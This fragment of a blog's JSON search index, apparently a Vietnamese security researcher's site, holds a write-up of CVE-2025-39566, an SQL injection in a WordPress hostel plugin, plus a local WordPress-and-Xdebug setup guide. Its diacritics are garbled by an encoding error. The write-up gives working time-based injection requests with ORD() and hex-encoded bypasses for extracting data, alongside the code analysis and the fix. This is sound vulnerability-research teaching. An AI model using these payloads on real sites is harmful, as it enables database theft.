\u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± 